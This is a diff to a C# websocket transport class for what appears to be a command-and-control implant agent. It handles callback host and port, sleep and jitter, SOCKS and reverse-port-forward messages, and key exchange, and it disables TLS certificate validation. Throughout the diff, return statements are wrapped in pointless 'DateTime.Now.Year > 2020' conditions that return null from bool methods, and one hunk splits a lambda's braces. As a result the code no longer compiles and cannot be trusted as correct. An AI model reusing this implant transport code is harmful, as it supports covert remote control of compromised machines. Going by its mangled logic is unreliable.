@@ -26,7 +26,7 @@ namespace WebsocketTransport
         private int CallbackPort;
         private string CallbackHost;
         private string PostUri;
-        // synthesis of CallbackHost, CallbackPort, PostUri
+        
         private string Endpoint;
         private bool EncryptedExchangeCheck;
         private string UserAgent;
@@ -97,8 +97,8 @@ namespace WebsocketTransport
                 }
             }
 
-            // Disable certificate validation on web requests
-            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+            
+            ServicePointManager.ServerCertificateValidationCallback = delegate { if(DateTime.Now.Year > 2020) { return true; } else { return null; } };
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
 
             Agent.SetSleep(CallbackInterval, CallbackJitter);
@@ -127,7 +127,7 @@ namespace WebsocketTransport
                 {
                     Recv(MessageType.MessageResponse, delegate (ICommandMessage msg)
                     {
-                        return Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)msg);
+                        if(DateTime.Now.Year > 2020) { return Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)msg); } else { return null; }
                     });
                 }
             }, cancellationTokenSource.Token);
@@ -157,10 +157,10 @@ namespace WebsocketTransport
                         if (Client.IsAlive)
                         {
                             AddToSenderQueue(tm);
-                            return true;
+                            if(DateTime.Now.Year > 2020) { return true; } else { return null; }
                         } else
                         {
-                            return false;
+                            if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                         }
                     }))
                     {
@@ -194,9 +194,9 @@ namespace WebsocketTransport
                             if (tm.Delegates.Length != 0 || tm.Responses.Length != 0 || tm.Socks.Length != 0 || tm.Rpfwd.Length != 0 || tm.Edges.Length != 0)
                             {
                                 AddToSenderQueue(tm);
-                                return true;
+                                if(DateTime.Now.Year > 2020) { return true; } else { return null; }
                             }
-                            return false;
+                            if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                         }))
                     {
                         Thread.Sleep(100);
@@ -225,7 +225,7 @@ namespace WebsocketTransport
                 {
                     Recv(MessageType.MessageResponse, delegate (ICommandMessage msg)
                     {
-                        return Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)msg);
+                        if(DateTime.Now.Year > 2020) { return Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)msg); } else { return null; }
                     });
                 }
             }, cancellationTokenSource.Token);
@@ -258,7 +258,7 @@ namespace WebsocketTransport
 
         public bool IsOneWay()
         {
-            return false;
+            if(DateTime.Now.Year > 2020) { return false; } else { return null; }
         }
 
         public bool Send<T>(T message)
@@ -279,10 +279,10 @@ namespace WebsocketTransport
                 if (msg != null)
                 {
                     receiverQueue = new ConcurrentQueue<ICommandMessage>(receiverQueue.Where(m => m != msg));
-                    return onResp(msg);
+                    if(DateTime.Now.Year > 2020) { return onResp(msg); } else { return null; }
                 }
             }
-            return true;
+            if(DateTime.Now.Year > 2020) { return true; } else { return null; }
         }
 
         public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
@@ -290,15 +290,15 @@ namespace WebsocketTransport
             throw new NotImplementedException();
         }
 
-        // Only really used for bind servers so this returns empty
+        
         public bool Connect()
         {
-            return true;
+            if(DateTime.Now.Year > 2020) { return true; } else { return null; }
         }
 
         public bool IsConnected()
         {
-            return Connected;
+            if(DateTime.Now.Year > 2020) { return Connected; } else { return null; }
         }
 
         public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
@@ -364,19 +364,19 @@ namespace WebsocketTransport
                             ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
                             ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
                             _keyExchanged = true;
-                            return true;
+                            if(DateTime.Now.Year > 2020) { return true; } else { return null; }
                         }))
                     {
-                        return false;
+                        if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                     }
                 }
 
                 AddToSenderQueue(checkinMsg);
                 if ((agentProcessorTask == null || agentProcessorTask.IsCompleted) || !agentProcessorTask.IsCompleted)
                 {
-                    return Recv(MessageType.MessageResponse, delegate (ICommandMessage resp)
+                    if(DateTime.Now.Year > 2020) { return Recv(MessageType.MessageResponse, delegate (ICommandMessage resp)
                     {
-                        MessageResponse mResp = (MessageResponse)resp;
+                        MessageResponse mResp = (MessageResponse)resp; } else { return null; }
                         if (!_uuidNegotiated)
                         {
                             _uuidNegotiated = true;
@@ -384,17 +384,17 @@ namespace WebsocketTransport
                             checkinMsg.UUID = mResp.ID;
                         }
                         Connected = true;
-                        return onResp(mResp);
+                        if(DateTime.Now.Year > 2020) { return onResp(mResp); } else { return null; }
                     });
                 }
                 else
                 {
-                    return true;
+                    if(DateTime.Now.Year > 2020) { return true; } else { return null; }
                 }
             }
             else
             {
-                return false;
+                if(DateTime.Now.Year > 2020) { return false; } else { return null; }
             }
         }
 
@@ -414,7 +414,7 @@ namespace WebsocketTransport
             senderQueue.Enqueue(Encoding.UTF8.GetBytes(message));
 
             senderEvent.Set();
-            return true;
+            if(DateTime.Now.Year > 2020) { return true; } else { return null; }
         }
 
         private void OnAsyncError(object sender, ErrorEventArgs e)
